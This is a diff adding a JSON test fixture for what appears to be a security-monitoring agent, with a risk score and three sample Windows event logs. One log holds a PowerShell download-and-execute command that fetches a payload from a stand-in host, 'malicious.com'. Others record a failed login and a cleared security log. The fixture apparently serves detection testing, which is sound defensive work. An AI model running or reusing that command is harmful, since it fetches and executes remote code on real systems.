@@ -1,0 +1,39 @@
+{
+  "agent_id": "TEST_AGENT_001",
+  "hostname": "TEST-WIN-SERVER",
+  "timestamp": "2025-10-15 09:50:00",
+  "received_at": "2025-10-15T02:01:15.805281",
+  "log_count": 3,
+  "features": [
+    0.02,
+    0.0,
+    0.1,
+    0.0,
+    0.0,
+    1.0
+  ],
+  "risk_score": 0.18666666666666668,
+  "logs": [
+    {
+      "event_id": 4625,
+      "user": "admin",
+      "source_ip": "192.168.1.100",
+      "message": "Failed login attempt"
+    },
+    {
+      "event_id": 4104,
+      "script_block": "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
+      "user": "user1",
+      "message": "PowerShell script block"
+    },
+    {
+      "event_id": 1102,
+      "user": "admin",
+      "message": "Security log was cleared"
+    }
+  ],
+  "metadata": {
+    "agent_version": "1.0.0",
+    "os_version": "Windows Server 2022"
+  }
+}
